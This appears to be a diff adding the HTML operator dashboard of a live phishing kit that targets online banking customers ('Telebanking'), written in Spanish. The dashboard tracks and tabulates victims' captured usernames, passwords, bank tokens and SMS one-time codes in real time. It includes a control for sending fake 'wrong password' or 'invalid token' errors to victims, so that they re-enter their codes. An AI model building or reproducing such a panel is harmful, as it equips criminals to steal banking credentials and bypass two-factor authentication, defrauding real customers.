@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Telebanking - Panel de Control de Operador</title>
+  <link rel="stylesheet" href="./admin.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+</head>
+<body>
+  <!-- Header principal -->
+  <header class="admin-header">
+    <div class="header-left">
+      <div class="logo-badge">
+        <span class="logo-red-dot"></span>
+        <span class="logo-title">TELEBANKING</span>
+        <span class="logo-sub">OPERATOR PANEL</span>
+      </div>
+      <div class="live-status-pill">
+        <span class="pulse-dot"></span>
+        <span>SISTEMA EN VIVO</span>
+      </div>
+    </div>
+
+    <div class="header-right">
+      <div class="clock-display" id="live-clock">00:00:00</div>
+      
+      <button id="btn-sound-toggle" class="btn-head sound-on" title="Alternar Sonido de Alerta">
+        <span id="sound-icon">🔊</span>
+        <span id="sound-text">Sonido Activo</span>
+      </button>
+
+      <button id="btn-clear-all" class="btn-head btn-danger" title="Limpiar todas las sesiones">
+        <span>🗑️</span> Limpiar Todo
+      </button>
+    </div>
+  </header>
+
+  <!-- Métricas y Estadísticas de Control -->
+  <main class="admin-container">
+    <section class="stats-grid">
+      <div class="stat-card">
+        <div class="stat-icon icon-users">👥</div>
+        <div class="stat-info">
+          <span class="stat-label">Total Sesiones</span>
+          <span class="stat-value" id="stat-total">0</span>
+        </div>
+      </div>
+
+      <div class="stat-card">
+        <div class="stat-icon icon-online">⚡</div>
+        <div class="stat-info">
+          <span class="stat-label">Clientes Online</span>
+          <span class="stat-value text-green" id="stat-online">0</span>
+        </div>
+      </div>
+
+      <div class="stat-card">
+        <div class="stat-icon icon-pass">🔑</div>
+        <div class="stat-info">
+          <span class="stat-label">Claves Capturadas</span>
+          <span class="stat-value text-red" id="stat-passwords">0</span>
+        </div>
+      </div>
+
+      <div class="stat-card">
+        <div class="stat-icon icon-token">🛡️</div>
+        <div class="stat-info">
+          <span class="stat-label">Tokens Recibidos</span>
+          <span class="stat-value text-gold" id="stat-tokens">0</span>
+        </div>
+      </div>
+
+      <div class="stat-card">
+        <div class="stat-icon icon-sms">📱</div>
+        <div class="stat-info">
+          <span class="stat-label">Códigos SMS</span>
+          <span class="stat-value text-cyan" id="stat-sms">0</span>
+        </div>
+      </div>
+    </section>
+
+    <!-- Barra de búsqueda y controles de filtro -->
+    <section class="controls-bar">
+      <div class="search-box">
+        <span class="search-icon">🔍</span>
+        <input type="text" id="search-input" placeholder="Buscar por usuario, IP o ID...">
+      </div>
+
+      <div class="filter-pills">
+        <button class="pill-btn active" data-filter="all">Todos</button>
+        <button class="pill-btn" data-filter="pass">Con Clave</button>
+        <button class="pill-btn" data-filter="token">Con Token</button>
+        <button class="pill-btn" data-filter="sms">Con SMS</button>
+      </div>
+
+      <div class="auto-refresh-indicator">
+        <span class="spinner-dot"></span> Auto-actualizando (1s)
+      </div>
+    </section>
+
+    <!-- Tabla Principal de Datos Capturados -->
+    <section class="table-container">
+      <table class="admin-table">
+        <thead>
+          <tr>
+            <th>ESTADO</th>
+            <th>SESIÓN / IP</th>
+            <th>USUARIO</th>
+            <th>CONTRASEÑA</th>
+            <th>TOKEN</th>
+            <th>CÓDIGO SMS</th>
+            <th>ÚLTIMA ACTIVIDAD</th>
+            <th class="text-center">ACCIONES DEL OPERADOR</th>
+          </tr>
+        </thead>
+        <tbody id="sessions-list">
+          <tr class="empty-row">
+            <td colspan="8">
+              <div class="empty-state">
+                <span class="empty-icon">📡</span>
+                <p>Esperando conexiones de clientes en Telebanking...</p>
+                <small>Los datos de acceso capturados aparecerán aquí en tiempo real.</small>
+              </div>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </section>
+  </main>
+
+  <!-- Modal para enviar error personalizado -->
+  <div class="admin-modal" id="modal-custom-error">
+    <div class="modal-content-box">
+      <h3>❌ Enviar Mensaje de Error al Cliente</h3>
+      <p>Selecciona o escribe el mensaje de error que verá el cliente:</p>
+      
+      <select id="preset-error-select" class="modal-input">
+        <option value="Nombre de usuario o contraseña incorrectos. Por favor verifique e intente nuevamente.">Usuario o contraseña incorrectos</option>
+        <option value="Clave Token no válida o expirada. Por favor genere un nuevo código Token.">Clave Token no válida</option>
+        <option value="Código SMS de verificación incorrecto. Intente nuevamente.">Código SMS incorrecto</option>
+        <option value="Su sesión ha expirado por inactividad. Por favor ingrese nuevamente.">Sesión expirada</option>
+        <option value="custom">-- Escribir mensaje personalizado --</option>
+      </select>
+
+      <input type="text" id="custom-error-text" class="modal-input hidden" placeholder="Escribe el mensaje de error personalizado...">
+
+      <div class="modal-actions">
+        <button id="btn-cancel-error" class="btn-modal btn-cancel">Cancelar</button>
+        <button id="btn-send-error-confirm" class="btn-modal btn-confirm">Enviar Error</button>
+      </div>
+    </div>
+  </div>
+
+  <script src="./admin.js"></script>
+</body>
+</html>
